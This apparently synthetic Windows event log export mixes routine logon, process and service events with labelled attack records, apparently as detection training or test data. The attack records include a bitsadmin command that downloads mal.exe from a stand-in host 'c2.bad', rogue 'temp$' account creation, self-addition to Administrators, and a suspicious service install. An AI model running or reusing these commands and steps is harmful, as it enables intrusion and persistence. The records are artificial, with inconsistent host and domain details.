<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{FD815B67-76D9-2874-8BF4-8735CF7A6527}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.490Z'/><EventRecordID>837640</EventRecordID><Channel>System</Channel><Computer>SRV-DC01.hq.internal</Computer></System><EventData><Data Name='param1'>Windows Update</Data><Data Name='param2'>running</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{F27AA1BE-6CBF-63EA-2590-514F16AA7A76}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.122Z'/><EventRecordID>698586</EventRecordID><Channel>System</Channel><Computer>WKS-PC003.corp.local</Computer></System><EventData><Data Name='param1'>DHCP Client</Data><Data Name='param2'>stopped</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{FE6C3585-1E6C-10EF-5A05-939DA1B3DFCB}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.740Z'/><EventRecordID>486097</EventRecordID><Channel>Security</Channel><Computer>SRV-WEB01.corp.local</Computer></System><EventData><Data Name='SubjectUserName'>acosta</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x36003</Data><Data Name='NewProcessName'>C:\Windows\System32\teams.exe</Data><Data Name='ProcessId'>3120</Data><Data Name='CommandLine'>teams.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{EB56D5AB-AA43-E223-CCC6-B0E81E8A91DF}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.973Z'/><EventRecordID>782187</EventRecordID><Channel>Security</Channel><Computer>SRV-DC01.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>nalmeida</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0xA8ABE</Data><Data Name='NewProcessName'>C:\Windows\System32\explorer.exe</Data><Data Name='ProcessId'>10504</Data><Data Name='CommandLine'>explorer.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{3E8745C0-01B8-00F0-8A5E-95313CE79EEF}'/><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>User Account Management</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.729Z'/><EventRecordID>370196</EventRecordID><Channel>Security</Channel><Computer>SRV-DC02.corp.local</Computer></System><EventData><Data Name='TargetUserName'>temp$</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='SubjectUserName'>guest</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x82D9C</Data><!-- SUSPICIOUS: suspicious_account_creation — account 'temp$' created by 'guest' --></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{497C0069-2746-DC8C-BBEA-9E1002DE2D22}'/><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>User Account Management</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.137Z'/><EventRecordID>264444</EventRecordID><Channel>Security</Channel><Computer>SRV-WEB01.hq.internal</Computer></System><EventData><Data Name='TargetUserName'>temp$</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='SubjectUserName'>temp_admin</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0x620CF</Data><!-- SUSPICIOUS: suspicious_account_creation — account 'temp$' created by 'temp_admin' --></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{508F80D4-9AB5-7C78-4427-CE884C8BB80B}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.904Z'/><EventRecordID>971845</EventRecordID><Channel>Security</Channel><Computer>WKS-PC001.empresa.local</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>WKS-PC001$</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0xAD2DD</Data><Data Name='TargetUserSid'>S-1-5-21-3429615-9272</Data><Data Name='TargetUserName'>bribeiro</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0x73A9E</Data><Data Name='LogonType'>7</Data><Data Name='IpAddress'>192.168.1.200</Data><Data Name='IpPort'>55739</Data><Data Name='WorkstationName'>WKS-PC001</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{F6C99D8E-E7B7-8976-94A6-3278C9902D00}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.627Z'/><EventRecordID>274815</EventRecordID><Channel>Security</Channel><Computer>SRV-APP01.corp.local</Computer></System><EventData><Data Name='SubjectUserName'>ggomes</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0x30441</Data><Data Name='NewProcessName'>C:\Windows\System32\MsMpEng.exe</Data><Data Name='ProcessId'>20014</Data><Data Name='CommandLine'>MsMpEng.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{626D99FD-B1CC-99F9-573B-55F01B511FA8}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.611Z'/><EventRecordID>259528</EventRecordID><Channel>System</Channel><Computer>SRV-FILE01.empresa.local</Computer></System><EventData><Data Name='param1'>Windows Firewall</Data><Data Name='param2'>running</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{589D7C08-2DD1-394D-D3EC-B61C713AF890}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.865Z'/><EventRecordID>797217</EventRecordID><Channel>Security</Channel><Computer>SRV-DC01.corp.local</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>WKS-NB011$</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0x79AB4</Data><Data Name='TargetUserSid'>S-1-5-21-1698620-7921</Data><Data Name='TargetUserName'>jsilva</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x7DC9D</Data><Data Name='LogonType'>3</Data><Data Name='IpAddress'>172.16.0.20</Data><Data Name='IpPort'>64619</Data><Data Name='WorkstationName'>WKS-NB011</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{5CD81BD4-35C2-D56F-8E4E-933D4E4E64C3}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.894Z'/><EventRecordID>621999</EventRecordID><Channel>Security</Channel><Computer>WKS-PC002.hq.internal</Computer></System><EventData><Data Name='TargetUserName'>nalmeida</Data><Data Name='TargetDomainName'>CORP</Data><Data Name='TargetLogonId'>0x9EF34</Data><Data Name='LogonType'>7</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{0B1CCD95-59B4-BD8B-18BE-D9E1C016EF45}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.541Z'/><EventRecordID>623814</EventRecordID><Channel>Security</Channel><Computer>WKS-PC003.hq.internal</Computer></System><EventData><Data Name='TargetUserName'>jsilva</Data><Data Name='TargetDomainName'>CORP</Data><Data Name='TargetLogonId'>0x33F93</Data><Data Name='LogonType'>2</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{A17B6425-7011-977A-E585-9F797E6271FC}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.233Z'/><EventRecordID>795717</EventRecordID><Channel>Security</Channel><Computer>SRV-APP01.corp.local</Computer></System><EventData><Data Name='TargetUserName'>acosta</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0xF016F</Data><Data Name='LogonType'>2</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{85E7B932-AA30-5145-ADCC-F43ED25BAACA}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.258Z'/><EventRecordID>375540</EventRecordID><Channel>System</Channel><Computer>WKS-NB010.corp.local</Computer></System><EventData><Data Name='param1'>Workstation</Data><Data Name='param2'>running</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{D4D15F7A-65C8-FAED-C4D2-89928D3366A1}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:12.043Z'/><EventRecordID>287462</EventRecordID><Channel>Security</Channel><Computer>SRV-PRINT01.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>bribeiro</Data><Data Name='SubjectDomainName'>EMPRESA</Data><Data Name='SubjectLogonId'>0xFFD6D</Data><Data Name='NewProcessName'>C:\Windows\System32\teams.exe</Data><Data Name='ProcessId'>20592</Data><Data Name='CommandLine'>teams.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{4E6FA4DB-CB46-D9FE-AC56-B9D80F570AA8}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:12.160Z'/><EventRecordID>789805</EventRecordID><Channel>System</Channel><Computer>WKS-PC002.empresa.local</Computer></System><EventData><Data Name='param1'>DHCP Client</Data><Data Name='param2'>running</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{E8B532A8-2685-8BD7-4EE6-278F5F417F91}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.417Z'/><EventRecordID>909602</EventRecordID><Channel>System</Channel><Computer>SRV-FILE01.empresa.local</Computer></System><EventData><Data Name='param1'>Task Scheduler</Data><Data Name='param2'>stopped</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{B771EBDD-2D0E-A11B-B957-2EB08ADECC69}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.514Z'/><EventRecordID>697663</EventRecordID><Channel>Security</Channel><Computer>SRV-PRINT01.corp.local</Computer></System><EventData><Data Name='SubjectUserName'>debug_user</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x9DB2F</Data><Data Name='NewProcessName'>C:\Windows\System32\bitsadmin.exe</Data><Data Name='ProcessId'>25528</Data><Data Name='CommandLine'>bitsadmin.exe /transfer evil /download http://c2.bad/mal.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\cmd.exe</Data><!-- SUSPICIOUS: suspicious_process — 'bitsadmin.exe /transfer evil /download http://c2.bad/mal.exe' --></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{F5B51C68-23CD-99BE-3EA9-30F750BB786A}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.131Z'/><EventRecordID>340178</EventRecordID><Channel>System</Channel><Computer>WKS-NB011.corp.local</Computer></System><EventData><Data Name='param1'>DNS Client</Data><Data Name='param2'>running</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{797C6FC7-F592-AB5E-AAFC-BC567240EBF2}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.854Z'/><EventRecordID>499165</EventRecordID><Channel>Security</Channel><Computer>WKS-NB011.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>tlima</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0xDA707</Data><Data Name='NewProcessName'>C:\Windows\System32\svchost.exe</Data><Data Name='ProcessId'>6118</Data><Data Name='CommandLine'>svchost.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{51480ED6-2B7F-24F1-196B-5AE5B9DB9BFD}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.974Z'/><EventRecordID>991446</EventRecordID><Channel>Security</Channel><Computer>SRV-WEB01.corp.local</Computer></System><EventData><Data Name='TargetUserName'>dfreitas</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0x4B002</Data><Data Name='LogonType'>7</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{1AC5C1DE-2A6F-5332-CF4F-C2856A8EF60D}'/><EventID>4720</EventID><Version>0</Version><Level>0</Level><Task>User Account Management</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.176Z'/><EventRecordID>268933</EventRecordID><Channel>Security</Channel><Computer>WKS-PC002.empresa.local</Computer></System><EventData><Data Name='TargetUserName'>temp$</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='SubjectUserName'>test</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0xA9757</Data><!-- SUSPICIOUS: suspicious_account_creation — account 'temp$' created by 'test' --></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{AFD2EEDC-EF84-B104-4F3E-A8D00BB52B53}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.093Z'/><EventRecordID>130786</EventRecordID><Channel>System</Channel><Computer>SRV-DB01.empresa.local</Computer></System><EventData><Data Name='param1'>Windows Firewall</Data><Data Name='param2'>running</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{7FD07559-A20C-A655-240A-F8887FAFAFE7}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.960Z'/><EventRecordID>887351</EventRecordID><Channel>Security</Channel><Computer>SRV-DB01.corp.local</Computer></System><EventData><Data Name='TargetUserName'>ggomes</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x5A393</Data><Data Name='LogonType'>2</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Service Control Manager' Guid='{4CDFC554-3D8B-42E5-E79B-40207F018ADF}'/><EventID>7036</EventID><Version>0</Version><Level>4</Level><Task>None</Task><Opcode>Info</Opcode><Keywords>Classic</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.058Z'/><EventRecordID>559026</EventRecordID><Channel>System</Channel><Computer>WKS-NB010.hq.internal</Computer></System><EventData><Data Name='param1'>Task Scheduler</Data><Data Name='param2'>stopped</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{AA235B4A-335E-F09A-F5AA-9F71835F23A8}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.538Z'/><EventRecordID>158847</EventRecordID><Channel>Security</Channel><Computer>WKS-PC003.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>dfreitas</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x6D451</Data><Data Name='NewProcessName'>C:\Windows\System32\teams.exe</Data><Data Name='ProcessId'>25658</Data><Data Name='CommandLine'>teams.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{FE0CBDC1-D65B-CB45-A9A2-441B57030041}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.955Z'/><EventRecordID>826060</EventRecordID><Channel>Security</Channel><Computer>WKS-NB010.hq.internal</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>WKS-PC003$</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x5FA56</Data><Data Name='TargetUserSid'>S-1-5-21-9051940-8970</Data><Data Name='TargetUserName'>ggomes</Data><Data Name='TargetDomainName'>CORP</Data><Data Name='TargetLogonId'>0x9BE77</Data><Data Name='LogonType'>2</Data><Data Name='IpAddress'>10.0.2.55</Data><Data Name='IpPort'>64827</Data><Data Name='WorkstationName'>WKS-PC003</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{197F44CA-D2F5-DFD2-124B-294084CB526D}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.056Z'/><EventRecordID>128664</EventRecordID><Channel>Security</Channel><Computer>SRV-APP01.hq.internal</Computer></System><EventData><Data Name='SubjectUserName'>tlima</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x89BD2</Data><Data Name='NewProcessName'>C:\Windows\System32\explorer.exe</Data><Data Name='ProcessId'>24392</Data><Data Name='CommandLine'>explorer.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{0ADE98EC-9ED9-767C-8C10-6AF0E03C1451}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.360Z'/><EventRecordID>188923</EventRecordID><Channel>Security</Channel><Computer>WKS-PC002.empresa.local</Computer></System><EventData><Data Name='TargetUserName'>tlima</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x5F76F</Data><Data Name='LogonType'>7</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{8D0ADD05-4515-7CCF-B78D-7652C4DEE781}'/><EventID>4732</EventID><Version>0</Version><Level>0</Level><Task>Security Group Management</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.402Z'/><EventRecordID>126859</EventRecordID><Channel>Security</Channel><Computer>WKS-PC003.empresa.local</Computer></System><EventData><Data Name='MemberName'>debug_user</Data><Data Name='MemberSid'>S-1-5-21-6314672-3626</Data><Data Name='TargetUserName'>Administrators</Data><Data Name='TargetDomainName'>Builtin</Data><Data Name='SubjectUserName'>debug_user</Data><Data Name='SubjectDomainName'>CORP</Data><!-- SUSPICIOUS: group_modification — 'debug_user' added to Administrators by 'debug_user' --></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{C6E15ED1-4846-25FF-1AD8-31D1327C5756}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.679Z'/><EventRecordID>601865</EventRecordID><Channel>Security</Channel><Computer>SRV-EXCH01.empresa.local</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>SRV-DC02$</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x7E3EA</Data><Data Name='TargetUserSid'>S-1-5-21-9383958-7543</Data><Data Name='TargetUserName'>psouza</Data><Data Name='TargetDomainName'>CORP</Data><Data Name='TargetLogonId'>0xC4E42</Data><Data Name='LogonType'>2</Data><Data Name='IpAddress'>10.0.1.101</Data><Data Name='IpPort'>63798</Data><Data Name='WorkstationName'>SRV-DC02</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{2425E151-ABB1-90C9-BFAA-BA86B7EDE6D5}'/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>Logon</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.380Z'/><EventRecordID>870721</EventRecordID><Channel>Security</Channel><Computer>WKS-PC003.hq.internal</Computer></System><EventData><Data Name='SubjectUserSid'>S-1-5-18</Data><Data Name='SubjectUserName'>WKS-NB010$</Data><Data Name='SubjectDomainName'>HQ</Data><Data Name='SubjectLogonId'>0x7D979</Data><Data Name='TargetUserSid'>S-1-5-21-4461648-3639</Data><Data Name='TargetUserName'>mrocha</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0x173D4</Data><Data Name='LogonType'>10</Data><Data Name='IpAddress'>10.0.2.10</Data><Data Name='IpPort'>54832</Data><Data Name='WorkstationName'>WKS-NB010</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{2346C041-1B61-07F2-20CF-9E4D521EFC2E}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.570Z'/><EventRecordID>867591</EventRecordID><Channel>Security</Channel><Computer>SRV-EXCH01.hq.internal</Computer></System><EventData><Data Name='TargetUserName'>cpereira</Data><Data Name='TargetDomainName'>EMPRESA</Data><Data Name='TargetLogonId'>0x8DDCF</Data><Data Name='LogonType'>7</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{C441A611-1A38-ED36-AFD9-4C37857D468B}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:10.646Z'/><EventRecordID>768457</EventRecordID><Channel>Security</Channel><Computer>SRV-DC02.empresa.local</Computer></System><EventData><Data Name='TargetUserName'>mrocha</Data><Data Name='TargetDomainName'>HQ</Data><Data Name='TargetLogonId'>0x351F2</Data><Data Name='LogonType'>3</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{E243A4FB-E9B4-1251-7B38-EBF84DA25177}'/><EventID>4634</EventID><Version>0</Version><Level>0</Level><Task>Logoff</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:11.298Z'/><EventRecordID>578715</EventRecordID><Channel>Security</Channel><Computer>SRV-PRINT01.hq.internal</Computer></System><EventData><Data Name='TargetUserName'>dfreitas</Data><Data Name='TargetDomainName'>CORP</Data><Data Name='TargetLogonId'>0xF3589</Data><Data Name='LogonType'>2</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{E82795CD-6A68-102C-02CE-17898113CB77}'/><EventID>4697</EventID><Version>0</Version><Level>0</Level><Task>Security System Extension</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:08.882Z'/><EventRecordID>749423</EventRecordID><Channel>Security</Channel><Computer>SRV-PRINT01.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>debug_user</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='ServiceName'>SystemHealthd</Data><Data Name='ServiceFileName'>C:\ProgramData\svc.exe</Data><Data Name='ServiceType'>0x10</Data><Data Name='ServiceStartType'>2</Data><!-- SUSPICIOUS: suspicious_service_install — service 'SystemHealthd' installed by 'debug_user' --></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{E6CB6779-F4AE-C42D-5C68-EB4EEBEDBE2C}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.220Z'/><EventRecordID>415927</EventRecordID><Channel>Security</Channel><Computer>SRV-PRINT01.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>ggomes</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x628BF</Data><Data Name='NewProcessName'>C:\Windows\System32\svchost.exe</Data><Data Name='ProcessId'>7592</Data><Data Name='CommandLine'>svchost.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Security-Auditing' Guid='{D9D71700-5B45-D002-F8E7-9ACA43F5BFB1}'/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>Process Creation</Task><Opcode>Info</Opcode><Keywords>Audit Success</Keywords><TimeCreated SystemTime='2026-05-23T15:28:09.606Z'/><EventRecordID>178299</EventRecordID><Channel>Security</Channel><Computer>WKS-NB010.empresa.local</Computer></System><EventData><Data Name='SubjectUserName'>loliveira</Data><Data Name='SubjectDomainName'>CORP</Data><Data Name='SubjectLogonId'>0x33AAB</Data><Data Name='NewProcessName'>C:\Windows\System32\taskhostw.exe</Data><Data Name='ProcessId'>26361</Data><Data Name='CommandLine'>taskhostw.exe</Data><Data Name='ParentProcessName'>C:\Windows\System32\svchost.exe</Data></EventData></Event>
